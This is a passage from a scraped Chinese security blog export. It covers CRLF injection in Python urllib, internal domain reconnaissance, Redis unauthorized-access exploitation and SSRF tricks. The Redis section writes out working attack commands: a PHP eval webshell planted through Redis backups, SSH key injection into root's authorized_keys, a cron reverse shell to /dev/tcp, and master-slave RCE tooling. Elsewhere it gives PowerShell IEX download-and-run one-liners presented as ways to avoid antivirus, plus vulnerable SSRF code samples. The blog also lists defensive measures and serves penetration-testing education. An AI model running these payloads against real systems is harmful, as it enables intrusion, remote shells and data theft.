运行之后虽然报错，但在Kali的Redis中成功创建了新的键值数据，也就是说成功通过Python urllib CRLF注入实现攻击Redis： 0x05 漏洞组合拳Http Request SmugglingHRS即HTTP请求走私，在2005年的时候已被提出，只是最近圈内比较重视敏感信息泄露这块才被重新关注，可参考： 比如原始请求如下： 12345GET /foo HTTP/1.1Accept-Encoding: identityUser-Agent: Python-urllib/3.4Host: 127.0.0.1Connection: close 根据HRS，攻击者可以追加注入一个完整的HTTP请求头： 1http://127.0.0.1%0d%0aConnection%3a%20Keep-Alive%0d%0a%0d%0aPOST%20%2fbar%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%0d%0aContent-Length%3a%2031%0d%0a%0d%0a%7b%22new%22%3a%22json%22%2c%22content%22%3a%22here%22%7d%0d%0a:12345/foo 此时请求包内容如下： 12345678910111213GET /foo HTTP/1.1Accept-Encoding: identityUser-Agent: Python-urllib/3.4Host: 127.0.0.1Connection: Keep-AlivePOST /bar HTTP/1.1Host: 127.0.0.1Content-Length: 31&#123;&quot;new&quot;:&quot;json&quot;,&quot;content&quot;:&quot;here&quot;&#125;:12345Connection: close 该请求在Apache HTTPD下是能成功利用的，但在其他的Web容器中就不一定能正确地解析利用了，这是需要前端服务和后端服务解析的二义性才能导致HRS攻击成功。 这种攻击可以用在内网攻击上，比如无认证的Rest接口等。 Redis未授权访问漏洞如果Redis在本地未设置密码验证即存在未授权访问漏洞，那么攻击者可以组合Python urllib CRLF注入漏洞来攻击利用Redis未授权访问漏洞，通过其备份文件的功能实现写WebShell、SSH公钥和定时任务反弹shell等等。 参考：Hack Redis via Python urllib HTTP Header Injection Memcached未授权访问漏洞Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，即使没有对外开放端口，但攻击者还是可以组合Python urllib CRLF注入漏洞来通过命令交互来直接读入Memcached中的敏感信息。 如果我们可以控制内网的Python访问一个URL，然后我们就可以轻松的访问memcached了，比如 1http://127.0.0.1%0d%0aset%20foo%200%200%205%0d%0aABCDE%0d%0a:11211/foo 就会产生下面的HTTP头 12345678GET /foo HTTP/1.1Accept-Encoding: identityConnection: closeUser-Agent: Python-urllib/3.4Host: 127.0.0.1set foo 0 0 5ABCDE:11211 当检查下面几行memcached的协议语法的时候，大部分都是语法错误，但是memcached在收到错误的命令的时候并不会关闭连接，这样攻击者就可以在请求的任何位置注入命令了，然后memcached就会执行。下面是memcached的响应（memcached是Debian下包管理默认配置安装的） 12345678ERRORERRORERRORERRORERRORSTOREDERRORERROR 经过确认，memcached中确实成功的插入了foo的值。这种场景下，攻击者就可以给内网的memcached实例发送任意命令了。如果应用依赖于memcached中存储的数据（比如用户的session数据，HTML或者其他的敏感数据），攻击者可能获取应用更高的权限了。这个利用方式还可以造成拒绝服务攻击，就是攻击者可以在memcached中存储大量的数据。 0x06 参考CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析 Python urllib HTTP头注入漏洞","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Python","slug":"Python","permalink":"https://www.mi1k7ea.com/tags/Python/"},{"name":"CRLF注入","slug":"CRLF注入","permalink":"https://www.mi1k7ea.com/tags/CRLF注入/"}]},{"title":"内网信息收集之域相关信息收集一","date":"2020-03-08T09:23:51.000Z","path":"2020/03/08/内网信息收集之域相关信息收集/","text":"0x00 参考《内网安全攻防》笔记。 0x01 判断是否存在域获得本机相关信息之后，就要判断当前内网中是否存在域。如果当前内网存在域，则需要判断所控主机是否在域内。 ipconfig命令1ipconfig /all 使用该命令即可查看网管IP、DNS IP、域名、本机是否和DNS服务器出于同一网段等信息。 然后就可以通过反向解析命令nslookup来解析域名的IP地址，用解析得到的IP地址进行对比，判断DC和DNS服务是否在同一台服务器上。 查看系统详细信息1systeminfo 显示项的“域”即域名，“登录服务器”即域控制器。若“域”为“WORKGROUP”则表示当前机器不在域内。 查询当前登录域及登录用户信息1net config workstation 显示项的“工作站域 DNS 名称”即域名（若为“WORKGROUP”则表示不在域中），“登录域”用于表示当前登录的用户是域用户还是本地用户。 判断主域1net time /domain 该命令用于判断主域（域服务器通常会同时作为时间服务器使用），执行后通常会有如下三种情况： 1、存在域，但当前用户不是域用户。 2、存在域，且当前用户是域用户。 3、当前网络环境为工作组，不存在域。 0x02 探测域内存活主机在进行域内存活主机探测的时候，有几个注意点： 尽量避免触发域内的一些防病毒软件的告警和拦截； 在非授权情况下，避免使用工具进行暴力扫描； 尽量避免在目标机子上使用图形化工具； 尽量使用系统自带的工具进行探测，如powershell脚本； 利用NetBIOS探测内网NetBIOS，为网上基本输入输出系统（Network Basic Input/Output System）的缩写，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。严格来说，NetBIOS不是一种网上协议，而是应用程序接口（API）。较古老的操作系统，使用IEEE 802.2与IPX/SPX协议，可以使用NetBIOS Frames协议或NetBIOS over IPX/SPX协议来运作。现代操作系统，多数都使用TCP/IP协议，则可透过NetBIOS over TCP/IP协议来相互通信。 几乎所有的局域网都是基于NetBIOS基础上进行工作的，NetBIOS的工作流程就是正常的机器名解析查询应答过程，因此在内网探测域内存活主机时优先使用NetBIOS进行探测。 nbtscan是一个命令行工具，用于扫描本地或远程TCP/IP网络上的开放NetBIOS名称服务器。其有Windows版本和Linux版本，体积很小，且不需要特殊的库或DLL，使用简单，无参输入nbtscan.exe即可查看帮助文档。 将nbtscan上传到内网目标主机，然后直接在指定目标IP段进行扫描即可： Linux版本是一样的，这里看Kali默认的： 具体参数说明如下表： Token 含义 SHARING 该机器中有运行文件和打印共享服务，但不一定有内容共享 DC 该机器可能是域控制器 U=USER 该机器有登录名为 USER 的用户（不是太准确） IIS 该机器可能安装了 IIS 服务器 EXCHANGE 该机器可能安装了微软的 EXCHANGE NOTES 该机器可能安装了 IBM 的 LOTUS NOTES（电子邮件客户端） ? 没有识别出该机器的 NETBIOS 资源 利用ICMP协议探测内网即使用ping来探测内网。 可以使用如下命令循环探测内网C段： 1for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr \"TTL=\" 也可以使用VBS脚本进行探测，icmp.vbs： 12345678910111213141516171819202122232425strSubNet = \"192.168.1.\"Set objFSO= CreateObject(\"Scripting.FileSystemObject\")Set objTS = objfso.CreateTextFile(\"C:\\Windows\\Temp\\Result.txt\")For i = 1 To 254strComputer = strSubNet &amp; iblnResult = Ping(strComputer)If blnResult = True ThenobjTS.WriteLine strComputer &amp; \" is alived ! :) \"End IfNextobjTS.CloseWScript.Echo \"All Ping Scan , All Done ! :) \"Function Ping(strComputer)Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")Set colItems = objWMIService.ExecQuery(\"Select * From Win32_PingStatus Where Address='\" &amp; strComputer &amp; \"'\")For Each objItem In colItemsSelect case objItem.StatusCodeCase 0Ping = TrueCase ElsePing = FalseEnd selectExit ForNextEnd Function 不同场景改下IP段即可，扫描结果默认保存在C:\\Windows\\Temp\\Result.txt中： 利用ARP探测内网这里介绍3个工具。 arp-scanWindows下运行： Linux版的参考Kali中自带的即可： Empire中的arpscan模块Empire中内置了arpscan模块，用于在局域网内发送ARP数据包、收集活跃主机的IP地址和MAC地址信息。 在Empire中输入命令如下命令即可使用arpscan模块：usemodule powershell/situational_awareness/network/arpscan Nishang中的Invoke-ARPScan.ps1脚本源码：Invoke-ARPScan.ps1 新版Nishang下的脚本：https://github.com/samratashok/nishang/tree/master/Scan 远程下载运行： 1powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString(' http://192.168.1.1/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 192.168.1.0/20\" &gt;&gt; c:\\windows\\temp\\log.txt 本地运行： 1powershell.exe -exec bypass -Command \"&amp; &#123;Import-Module C:\\windows\\temp\\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/24&#125;\" &gt;&gt; C:\\windows\\temp\\log.txt 无条件运行，即不下载到本地硬盘而是在内存中运行，不触发防护软件的检测： 1powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,8080,3389,80' -oA c:\\windows\\temp\\res.txt\" 利用TCP/UDP端口扫描探测内网ScanLine是一个同时支持TCP和UDP端口扫描的体积小的端口扫描工具，可以在所有版本的Windows上使用。 1sl -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\\windows\\temp\\sl_res.txt -p 192.168.1.1-254 /b 0x03 域内端口扫描一般端口扫描需要关注如下三点： 端口的Banner信息； 端口上运行的服务； 常见服务的默认端口号； 在内网渗透中，建议使用Metasploit内置的端口扫描或者通过上传端口扫描工具或者根据服务器环境自定义扫描脚本来进行扫描。在授权的情况下，可以使用Nmap和Masscan等工具进行扫描。 利用telnet进行扫描Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。 一般，若想快速探测某主机的某个常见服务端口是否开放，此时使用telnet扫描最为方便。 S扫描器S扫描器是较老的一款快速端口扫描工具，支持大网段扫描，适用于Windows Server 2003及以下版本的系统（以上版本速度较慢、会有点报错）。 S扫描器的扫描结果默认保存在其目录下的result.txt文件中，推荐使用TCP扫描，命令如下： 1S.exe TCP 192.168.1.1 192.168.1.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 /Banner /save Metasploit端口扫描Metasploit不仅提供了多种端口扫描技术，还提供了与其他扫描工具的接口。 使用search portscan命令即可搜索出相关模块： 利用auxiliary/scanner/portscan/tcp模块扫描示例： PowerSploit的Invoke-Portscan.ps1脚本脚本地址：https://github.com/PowerShellMafia/PowerSploit/blob/d943001a7defb5e0d1657085a77a0e78609be58f/Recon/Invoke-Portscan.ps1 推荐使用无文件的形式来进行扫描： 1powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,8080,3389,80' -oA c:\\windows\\temp\\res.txt\" 下载地址如果是无法连外网的内网自己可自行修改为内网其他的可访问的Web服务地址。 Nishang的Invoke-PortScan模块作为Nishang的端口扫描模块，Invoke-PortScan模块主要用于主机发现、解析主机名、扫描端口等。 Nishang项目地址：https://github.com/samratashok/nishang 可以输入Get-Help Invoke-PortScan -full命令查看使用教程。使用的时候需要先将模块先导入到当前powershell会话中。 几个参数如下： StartAddress：范围扫描起始地址； EndAddress：范围扫描结束地址； ScanPort：进行端口扫描； Port：指定端口扫描，默认扫描常见服务端口； Timeout：设置超时时间； 可以全部导入，扫描指定范围局域网内存活主机并解析主机名： 12PS C:\\nishang&gt; Import-Module .\\nishang.psm1PS C:\\nishang&gt; Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.10 -ResolveHost 也可以单个导入： 12PS C:\\nishang&gt; . C:\\nishang\\Scan\\Invoke-PortScan.ps1PS C:\\nishang&gt; Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.10 -ResolveHost 端口Banner信息小结通过端口扫描发现存在的端口后，可以使用客户端连接工具或者nc来获取服务端的Banner信息。通过Banner信息识别出特定服务再进行进一步的渗透测试。 常见端口说明如下： 0x04 域内基础信息收集确定了当前内网拥有的域，并且所控制的主机在域内，就能进行域内一些基础信息的收集了。 注意：本小节列出的查询命令本质上都是通过LDAP协议到域控制器上进行查询的，因此在查询时是需要进行权限认证的。此时，只有域用户才拥有权限查询，本地用户是无法运行本小节的查询命令的，当然System权限用户除外。在域中，除普通用户外，所有的机器都有一个机器用户，其用户名为机器名加上$。System权限用户对应的就是域里的机器用户，所以System权限用户可以运行需要权限认证的查询命令。 查询域1net view /domain 查询域内所有主机如下命令可以通过查询得到的主机名对主机角色进行初步判断，比如”dev”可能是开发服务器，”web”、”app”等可能是Web服务器，”NAS”可能是存储服务器，”fileserver”可能是文件服务器等： 1net view /domain:HACKER 查询域内所有用户组列表1net group /domain 系统自带的常见用户身份如下： Domain Admins：域管理员； Domain Computers：域内机器； Domain Controllers：域控制器； Domain Guests：域访客，权限较低； Domain Users：域用户； Enterprise Admins：企业系统管理员用户； 可以看到有13个用户组： 查询所有域成员计算机列表1net group \"domain computers\" /domain 获取域密码相关信息如下命令可以获取域密码策略、密码长度、错误锁定等信息： 1net accounts /domain 获取域信任信息1nltest /domain_trusts 0x05 查找域控制器查找域控制器的机器名1nltest /DCLIST:hacker 获取域控制器的机器名为”DC”： 查看域控制器的主机名1Nslookup -type=SRV _ldap._tcp 运行后看到域控制器的主机名为”dc”： 查看当前时间一般的，时间服务器为主域控制器。 1net time /domain 查看域控制器组1net group \"Domain Controllers\" /domain 在实际环境中，一个域内是存在两台或以上的域控制器，用以实现主备。 1netdom query pdc 这里可以看到主域控制器的机器名为”DC”（注意，win7中默认没有netdom命令，winserver有）： 0x06 查询域内用户和管理员信息查询所有域用户列表向域控制器进行查询如下命令会向域控制器DC进行查询： 1net user /domain 运行后发现域内存在4个用户，其中krbtgt用户不仅可以创建票据授权服务（TGS）的加密密钥、还可以实现多种域内权限持久化方法： 获取域内用户的详细信息如下命令可获取域内用户的详细信息，包括用户名、描述信息、SID、域名、状态等： 1wmic useraccount get /all 查询存在的用户1dsquery user dsquery是AD的命令，只能在AD上使用： 查询本地管理员组用户1net localgroup administrators /domain 执行后看到本地管理员组存在两个用户和一个组： Domain Admins组中的用户默认为域内机器的本地管理员用户。在实际应用中，为了方便管理，会有域用户被设置为域机器的本地管理员用户。 查询域管理员用户组查询域管理员用户1net group \"domain admins\" /domain 查询管理员用户组1net group \"Enterprise Admins\" /domain","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.mi1k7ea.com/tags/内网渗透/"}]},{"title":"Redis安全小结","date":"2020-03-05T14:29:30.000Z","path":"2020/03/05/Redis安全小结/","text":"0x01 Redis简介REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。 Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 Redis服务的默认端口是6379。 官网查看更多信息：https://redis.io/ 常用命令常见命令如下： 查看信息：info 删除所有数据库内容：flushall 刷新数据库：flushdb 查看所有键：keys *，使用select num可以查看键值数据 设置变量：set aaa “mi1k7ea” 查看变量值：get aaa 查看备份文件路径：config get dir 设置备份文件路径：config set dir dirpath 查看备份文件名：config get dbfilename 设置备份文件名：config set dbfilename filename 保存备份文件：save 漏洞环境搭建这里搭建漏洞版本的Redis服务，同时配置服务进行全网监听： 123456789101112131415161718192021222324# 下载并解压运行makewget http://download.redis.io/releases/redis-3.2.11.tar.gztar zxf redis-3.2.11.tar.gzcd redis-3.2.11/make# 进入src目录中将redis-server和redis-cli复制到/usr/bin目录下，方便命令识别cd srccp redis-server /usr/bin/cp redis-cli /usr/bin/# 将redis.conf复制到/etc/目录下cd ..cp redis.conf /etc/# 编辑/etc/中的redis配置文件redis.confvim /etc/redis.conf# 注释掉本地绑定，允许除本地外的主机远程访问Redis服务# #bind 127.0.0.1# 关闭保护模式，允许远程连接Redis服务# protected-mode no# 使用/etc/目录下的redis.conf文件中的配置来启动Redis服务redis-server /etc/redis.conf 接着在Windows下就能无需密码认证直接远程连接Redis了： 1redis-cli -h 192.168.10.137 -p 6379 安全配置密码验证我们可以通过Redis的配置文件设置密码参数，这样客户端连接到Redis服务就需要密码验证，这样可以让你的Redis服务更安全，进而杜绝了未授权访问漏洞。 我们可以通过以下命令查看是否设置了密码验证： 123127.0.0.1:6379&gt; CONFIG get requirepass1) &quot;requirepass&quot;2) &quot;&quot; 默认情况下requirepass参数是空的，这就意味着你无需通过密码验证就可以连接到Redis服务。 你可以通过以下命令来修改该参数： 12345127.0.0.1:6379&gt; CONFIG set requirepass &quot;runoob&quot;OK127.0.0.1:6379&gt; CONFIG get requirepass1) &quot;requirepass&quot;2) &quot;runoob&quot; 设置密码后，客户端连接Redis服务就需要密码验证，否则无法执行命令。 密码验证用到AUTH命令，如下： 123456127.0.0.1:6379&gt; AUTH &quot;password&quot;OK127.0.0.1:6379&gt; SET mykey &quot;Test value&quot;OK127.0.0.1:6379&gt; GET mykey&quot;Test value&quot; 0x02 Redis漏洞攻击利用Redis漏洞包括未授权访问漏洞所引起的一系列深入攻击利用以及其他一些已知的Redis CVE漏洞。 在旧版本中Redis默认配置的服务是监听在公网的，而在最近这些新版本中都默认将监听地址改为本地监听，即前面redis.conf中看到的bind 127.0.0.1。 未授权访问漏洞由于配置不当的原因，导致Redis服务暴露在公网（即绑定在0.0.0.0:6379），并且没有开启相关认证和添加相关安全策略的情况下，即存在未授权访问漏洞。 攻击者在未授权访问Redis的情况下，可以获取数据库的所有数据、删除数据库数据等，进一步地可以利用Redis相关方法来实现写入WebShell、写入Crontab定时任务、写入SSH公钥以及利用主从复制RCE等一系列的攻击利用，将Redis未授权访问漏洞的危害无限放大。 敏感信息泄露与数据库内容删除使用Redis的语句可以获取数据库中的存储的敏感信息，这里为了方便直接通过keys *来获取所有的键，然后通过get命令获取键值（如果在实际的业务中，一般不会查询所有键，因为对性能影响太大了，而是通过查询指定的某些数据库内容）： 使用info命令可以看到Redis的版本、OS内核版本、配置文件路径等信息： 使用flushall等相关命令可以将Redis数据库所有内容删除掉，注意要慎用： 向Web目录写入WebShell前提是Redis所在机子开启了Web服务，且已知Web服务目录路径。 原理就是在Redis中插入一条数据，将WebShell代码作为value，key值随意，然后通过修改数据库的默认路径为Web服务目录和默认的缓存文件为WebShell文件，最后通过save命令以备份的方式把缓存的数据保存在文件里，这样就可以在服务器端的Web目录下生成一个WebShell文件。 具体步骤就是先写入一个含WebShell代码的键值，然后设置备份目录为Web目录，接着设置备份文件名为WebShell文件名，最后通过save命令保存文件到本地。如下： 1234set payload &quot;&lt;?php @eval($_POST[c]);?&gt;&quot;config set dir /var/www/html/config set dbfilename shell.phpsave 在服务端看到生成的shell.php内容如下，可以看到PHP代码穿插其中： 由于PHP的容错性，该PHP代码是能正常执行的，能正常getshell： 写入SSH公钥直接登录前提是Redis服务是以root权限运行的。 原理和前面一样的，只是备份的目录和文件名修改为/root/.ssh/目录和authorized_keys文件名。 先在Ubuntu中生成公私钥： 1ssh-keygen -t rsa 获取公钥内容cat /home/ski12/.ssh/id_rsa.pub： 1ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu 通过Redis客户端将公钥内容写入到/root/.ssh/authorized_keys文件中，注意保存key的时候加上两个\\n是为了避免和Redis里其他缓存数据混合： 1234config set dir /root/.ssh/config set dbfilename authorized_keysset payload &quot;\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu\\n\\n&quot;save 为了不用自己复制粘贴公钥内容，换种形式也OK： 12(echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") &gt; m7.txtcat m7.txt | redis-cli -h 192.168.10.137 -p 6379 set payload 此时看到Kali中的/root/.ssh/目录中成功生成了authorized_keys文件的： 注意，如果Kali中的SSH服务还没开启的话，通过如下命令开启即可： 1systemctl start ssh 接着在Ubuntu上使用私钥直接SSH远程连接到Kali，得到shell： 1ssh -i id_rsa root@192.168.10.137 写入定时任务反弹shell该方法只能CentOS上使用，Ubuntu、Debian上行不通。原因如下： 权限问题，Ubuntu定时任务需要root权限； Redis备份文件存在乱码，而Debian和Ubuntu对定时任务的格式校验很严格，因此在Debian和Ubuntu上会报错，而在CentOS上不会报错； 原理和前面是一样的，只是备份的目录和文件名修改了下： 1234config set dir /var/spool/cron/crontabs/config set dbfilename rootset payload &quot;\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.307/666 0&gt;&amp;1\\n\\n&quot;save 注意，不同类型、版本的OS的crontabs所在路径会有所区别。 可以看到在Kali中成功生成root文件，其中含有定时任务的内容，也包括了乱码： 此时并未在监听端接收到反弹shell。这是由于Kali是Debian系统，对定时任务的格式要求很严，而root文件内容含有乱码，会导致执行不成功。除此之外，还有root文件执行的权限问题，我们通过tail /var/log/syslog命令来查看如下错误信息，因为权限不够、所以cron拒绝执行该定时任务： 1cron[441]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root) 具体CentOS的利用可自行测试。 不同OS的系统任务调度文件： 12345678910Ubuntu/var/spool/cron/crontabs/xxxDebian/etc/cron.d/xxx或/var/spool/cron/crontabs/xxxAlpine/etc/cron.d/xxx 可进行利用的cron有如下几个地方： /etc/crontab 这个是肯定的 /etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。 /var/spool/cron/root centos系统下root用户的cron文件 /var/spool/cron/crontabs/root debian系统下root用户的cron文件 其他的利用任何可利用Redis未授权访问漏洞来写文件的地方都能被进行恶意利用，除了前面几项利用方式外，还有以下收集的几个在Linux或Windows下的利用方式。 写入/etc/passwd文件实现任意账号密码重置：https://www.freebuf.com/vuls/148758.html#-etcpasswd 写入Windows启动项：https://www.anquanke.com/post/id/170360#h3-3 写入Windows MOF：https://www.anquanke.com/post/id/170360#h3-4 利用主从复制RCERedis主从复制如果把数据存储在单个Redis中，而读写体量比较大的时候，服务端的性能就会大受影响。为了应对这种情况，Redis就提供了主从模式。 Redis主从模式是指使用一个Redis作为主机，其他Redis则作为从机即备份机。其中主机和从机数据相同，主机只负责写，从机只负责读，通过读写分离可以大幅度减轻流量的压力，即是一种通过牺牲空间来换取效率的缓解方式。 攻击利用主从复制实现RCE还是属于未授权访问的一种利用方式，这里因为其较新型便单独提出一小节。 4.x、5.x 版本的Redis提供了主从模式。在Redis 4.x 之后，通过外部扩展，可以在Redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意so文件，即可执行命令。 Redis主从数据库之间的同步分为两种： 全量复制是将数据库备份文件整个传输过去从机，然后从机清空内存数据库，将备份文件加载到数据库中； 部分复制只是将写命令发送给从机； 因此，想要复制备份文件的话就需要设置Redis主机的传输方式为全量传输。 这里我们只需要模拟协议收发包就能伪装成Redis主机了，利用工具如下： 12git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommandgit clone https://github.com/Ridter/redis-rce.git 第一个工具是用于生成恶意的执行shell的so文件；第二个工具是伪造Redis主机的脚本。 首先要生成恶意so文件，下载第一个工具然后make即可生成。 然后在攻击者机器上执行如下命令即可成功RCE： 1python redis-rce.py -r 192.168.10.137 -p 6379 -L 192.168.10.141 -f module.so 用Hydra暴力破解Redis密码使用Hydra工具可以对Redis密码进行暴力破解： 1hydra -P /home/fragrant/sec_tools/w3af/w3af/core/controllers/bruteforce/passwords.txt redis://192.168.10.137 历史CVE漏洞Redis远程代码执行漏洞（CVE-2016-8339）Redis 3.2.x &lt; 3.2.4 版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，从而RCE。 CVE-2015-8080Redis版本 2.8.x &lt; 2.8.24 和 3.0.x &lt; 3.0.6 中，lua_struct.c中的getnum函数存在整数溢出漏洞，导致攻击者可以运行Lua代码或可能绕过沙盒限制。 CVE-2015-4335Redis 2.8.1 之前版本和 3.0.2 之前版本中存在安全漏洞，攻击者可以远程执行eval命令，利用该漏洞执行任意Lua字节码。 CVE-2013-7458读取”.rediscli_history”配置文件信息。 不存在NoSQL注入问题？目前来说是的。 Redis客户端在与Redis服务端进行通信时，会使用RESP（REdis Serialization Protocol）协议。Redis客户端对所有的命令进行格式化处理，将不同参数组成的命令转换为符合RESP协议格式的数据，发送给Redis服务端的所有参数都是二进制安全的。 以下是RESP协议的通用形式： 123456*&lt;number of arguments&gt; CR LF$&lt;number of bytes of argument 1&gt; CR LF&lt;argument data&gt; CR LF...$&lt;number of bytes of argument N&gt; CR LF&lt;argument data&gt; CR LF 例子如下，原本命令为SET mykey myvalue： 1234567*3$3SET$5mykey$7myvalue Redis客户端格式化后的命令： 1&quot;*3\\r\\n$3\\r\\nSET\\r\\n$5\\r\\nmykey\\r\\n$7\\r\\nmyvalue\\r\\n&quot; Redis协议里面没有字符串转义相关的内容，Redis协议使用的是前缀长度的字符串，完全二进制，保证安全性，所以是不存在NoSQL注入的。 Lua脚本执行EVAL和EVALSHA命令时遵循相同的规则，因此这些命令也是安全的。 Redis协议规范可参考：http://www.redis.cn/topics/protocol.html Redis通信过程分析可参考：https://draveness.me/redis-cli 0x03 漏洞组合拳一些比较鸡肋的Web漏洞，在和本地Redis未授权访问漏洞组合进行深入利用后，往往会将危害达到最大化。 SSRF打本地Redis服务前提是Web服务器监听本地的Redis存在未授权访问漏洞，并且Web站点支持Gopher协议。这里就能把范围缩小了，PHP是支持Gopher协议的，而Java不支持。 具体可参考：利用 Gopher 协议拓展攻击面 Python urllib CRLF注入打本地Redis服务如果目标站点使用了Python漏洞版本的urllib库，并且请求的url外部可控，那么就可能存在内网被探测的风险，如果本机或内网服务器中装有未授权访问漏洞的Redis，那么服务器就存在被getshell的风险。 原理和组合SSRF漏洞完全一样，通过CRLF注入来利用Redis向Crontab写入反弹shell的定时任务。 具体可参考：Hack Redis via Python urllib HTTP Header Injection 0x04 防御方法 禁止公网开放Redis服务，可以在防火墙上禁用6379端口； 修改Redis服务端口为其他非常见的端口号； 配置Redis的密码访问验证； 禁用不使用的高危命令； 重命名高危命令的名称； 以低权限运行Redis服务，禁止用root等最高权限运行； 确保authorized_keys文件的安全，尽量阻止其他用户添加新的公钥； 0x05 参考记一次Redis+Getshell经验分享 Redis 基于主从复制的RCE利用方式 redis未授权访问漏洞利用","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Redis","slug":"Redis","permalink":"https://www.mi1k7ea.com/tags/Redis/"}]},{"title":"SSRF Tricks小结","date":"2020-02-29T15:53:30.000Z","path":"2020/02/29/SSRF-Tricks小结/","text":"0x00 前言SSRF漏洞原理很简单，这里只整理下SSRF的一些绕过技巧以及在不同语言下的细微差别。 0x01 SSRF in PHPSSRF相关函数在PHP中，涉及到SSRF漏洞的函数有： 123file_get_contents()fsockopen()curl_exec() 其中有如下几个注意点： 大部分PHP并不会开启fsockopen()的Gopher Wrapper； file_get_contents()的Gopher协议不能进行URLencode； file_get_contents()关于Gopher的302跳转有bug，会导致利用失败； file_get_contents()支持php://input协议； curl/libcurl 7.43版本上Gopher协议存在bug即%00截断，经测试7.49版本可用； curl_exec()默认不跟踪跳转； curl_exec()造成的SSRF： 12345678910function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);&#125;$url = $_GET['url'];curl($url); file_get_contents()造成的SSRF： 12$url = $_GET['url'];;echo file_get_contents($url); fsockopen()造成的SSRF： 1234567891011121314151617181920212223function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo \"$errstr (error number $errno) \\n\"; &#125; else &#123; $out = \"GET $link HTTP/1.1\\r\\n\"; $out .= \"Host: $host\\r\\n\"; $out .= \"Connection: Close\\r\\n\\r\\n\"; $out .= \"\\r\\n\"; fwrite($fp, $out); $contents=''; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125; 可利用的协议在PHP中能够进行SSRF攻击利用的协议： 